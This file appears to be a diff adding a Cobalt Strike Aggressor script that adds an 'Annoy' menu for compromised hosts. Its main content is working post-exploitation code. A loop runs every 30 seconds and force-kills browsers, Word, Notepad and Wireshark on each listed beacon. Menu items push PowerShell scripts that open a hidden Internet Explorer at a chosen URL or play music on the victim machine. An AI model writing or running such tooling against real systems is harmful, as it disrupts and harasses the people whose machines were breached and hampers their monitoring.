@@ -1,0 +1,116 @@
+
+global('@annoylist');
+
+sub startannoying {
+  if ($1 !in @annoylist) {
+    add(@annoylist, $1);
+    btask($1,"Added $1 to AnnoyList");
+  bnote($1,"Annoying !!!! ");
+  }
+  else {
+    btask($1,"$1 is already on Annoy List");
+  }
+}
+
+sub stopannoying {
+  if ($1 in @annoylist){
+    @rem = @($1);
+    @annoylist = removeAll(@annoylist, @rem);
+    btask($1,"Removed $1 from AnnoyLists");
+  bnote($1,"");
+    }
+  else {
+    btask($1,"$1 is not being pissed off yet");
+  }
+}
+
+#aliases for command line action 
+alias annoy {
+  startannoying($1);
+}
+
+alias annoystop {
+  stopannoying($1);
+}
+alias annoystatus {
+  btask($1,@annoylist);
+}
+
+# do annoying stuff every 30s
+on heartbeat_30s {
+
+	foreach $bid (@annoylist) {
+		# kill stuff	
+		bshell($bid,"TASKKILL /F /IM acroRd32.exe /IM chrome.exe /IM firefox.exe /IM wireshark.exe /IM notepad.exe /IM winword.exe");
+	}
+}
+
+
+####
+# shameless rip from und3rFl0w :)
+# https://github.com/Und3rf10w/Aggressor-scripts/blob/master/postExploit/postExploit.cna
+#
+popup beacon_bottom {
+
+menu "Annoy" {
+
+	item "Start Annoying" {
+        local('$bid');
+        foreach $bid ($1){
+		startannoying($bid);
+        }
+	}
+
+	item "Stop Annoying" {
+        local('$bid');
+        foreach $bid ($1){
+                stopannoying($bid);
+        }
+	}
+
+	item "Open Hidden Internet Explorer" {
+	local('$bid');
+	foreach $bid ($1){
+		binput($1, "powershell-import Open-HiddenInternetExplorer.ps1");
+		bpowershell_import($1, script_resource("scripts/Open-HiddenInternetExplorer.ps1"));
+		prompt_text("URL to open?", "https://www.youtube.com/watch?v=wZZ7oFKsKzY", {
+		$videoURL = $1;
+		return $videoURL;
+	});
+	binput($1, "powershell Open-HiddenInternetExplorer $videoURL ");
+	bpowershell($1, "Open-HiddenInternetExplorer $videoURL ");
+	}
+	}
+# Credit goes to SadProcessor for these scripts!
+	menu "Play chiptunes" {
+		item "Play Imperial March" {
+		local('$bid');
+		foreach $bid ($1){
+			binput($1, "powershell-import Play-ImperialMarch.ps1");
+			bpowershell_import($1, script_resource("scripts/Play-ImperialMarch.ps1"));
+			binput($1, "powershell Play-ImperialMarch");
+			bpowershell($1, "Play-ImperialMarch");
+			}
+		}
+	item "Play Rickroll" {
+		local('$bid');
+		foreach $bid ($1){
+		binput($1, "powershell-import Play-RickAstley.ps1");
+		bpowershell_import($1, script_resource("scripts/Play-RickAstley.ps1"));
+		binput($1, "powershell Play-RickAstley");
+		bpowershell($1, "Play-RickAstley");
+			}
+		}
+	item "Play Tetris Theme" {
+		local('$bid');
+		foreach $bid ($1){
+		binput($1, "powershell-import Play-TetrisTune.ps1");
+		bpowershell_import($1, script_resource("scripts/Play-TetrisTune.ps1"));
+		binput($1, "powershell Play-TetrisTune");
+		bpowershell($1, "Play-TetrisTune");
+				}
+			}
+		}
+	}
+}
+
